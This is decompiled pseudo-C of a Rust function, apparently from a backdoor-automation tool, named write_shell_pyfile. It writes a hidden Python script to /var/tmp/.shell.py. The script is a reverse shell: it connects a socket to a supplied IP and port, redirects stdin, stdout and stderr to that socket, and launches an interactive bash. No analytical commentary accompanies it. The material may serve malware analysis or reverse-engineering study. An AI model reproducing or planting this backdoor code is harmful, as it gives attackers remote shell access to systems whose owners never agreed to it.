
  char const (**)[0x94] backdoorautomater::modifyservice::write_shell_pyfile::hce4cf953ddafe0d0(int64_t* arg1, int64_t* arg2)

{
    int32_t var_88;
    std::fs::File::create::hf69a1aea5d21dd7b(&var_88, "/var/tmp/.shell.pyimport socket,…");
    char const (** result)[0x94];
    
    if (!var_88)
    {
        int32_t fd_1;
        int32_t fd = fd_1;
        char const (** result_2)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
            "import socket,subprocess,os;\ns=…", 0x1d);
        result = result_2;
        
        if (result_2)
        {
            core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
        }
        else
        {
            char const (** result_3)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, 
                "s=socket.socket(socket.AF_INET,s…", 0x34);
            result = result_3;
            
            if (result_3)
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
            }
            else
            {
                var_88 = "v_ip='os.dup2(s.fileno(),0);\nos…";
                int64_t var_80 = 6;
                int128_t var_78_1 = *(arg2 + 8);
                int128_t var_30;
                alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_30, &var_88, 2, 1, 0);
                int128_t var_68 = var_30;
                alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_68, 
                    "';\n));\n$i='kindNoneSomeZeroIpv…", 3);
                uint64_t var_20;
                char const (** result_4)[0x94] =
                    std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_68[8], var_20);
                result = result_4;
                
                if (result_4)
                    goto label_4556e5;
                
                var_88 = "s.connect((v_i";
                int64_t var_80_1 = 0x10;
                int128_t var_78_2 = *(arg1 + 8);
                alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_30, &var_88, 2, 1, 0);
                int128_t var_48 = var_30;
                alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_48, 
                    "));\n$i='kindNoneSomeZeroIpv4Ipv…", 4);
                char const (** result_5)[0x94] =
                    std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_48[8], var_20);
                result = result_5;
                
                if (result_5)
                {
                    label_4556db:
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                        &var_48);
                    label_4556e5:
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                        &var_68);
                    core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
                }
                else
                {
                    char const (** result_6)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                        &fd, "os.dup2(s.fileno(),0);\nos.dup2(…", 0x17);
                    result = result_6;
                    
                    if (result_6)
                        goto label_4556db;
                    
                    char const (** result_7)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                        &fd, "os.dup2(s.fileno(),1);\nos.dup2(…", 0x17);
                    result = result_7;
                    
                    if (result_7)
                        goto label_4556db;
                    
                    char const (** result_8)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                        &fd, "os.dup2(s.fileno(),2);\nv_shell_…", 0x17);
                    result = result_8;
                    
                    if (result_8)
                        goto label_4556db;
                    
                    char const (** result_9)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                        &fd, "v_shell_path='/usr/bin/bash';\nv…", 0x1e);
                    result = result_9;
                    
                    if (result_9)
                        goto label_4556db;
                    
                    char const (** result_10)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                        &fd, "v_shell_value='-i';\np=subproces…", 0x14);
                    result = result_10;
                    
                    if (result_10)
                        goto label_4556db;
                    
                    char const (** result_11)[0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                        &fd, "p=subprocess.call([v_shell_path,…", 0x31);
                    result = result_11;
                    
                    if (result_11)
                        goto label_4556db;
                    
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                        &var_48);
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                        &var_68);
                    core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
                    result = nullptr;
                }
            }
        }
    }
    else
    {
        char const (** result_1)[0x94];
        result = result_1;
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
    }
    
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg1);
    return result;
}
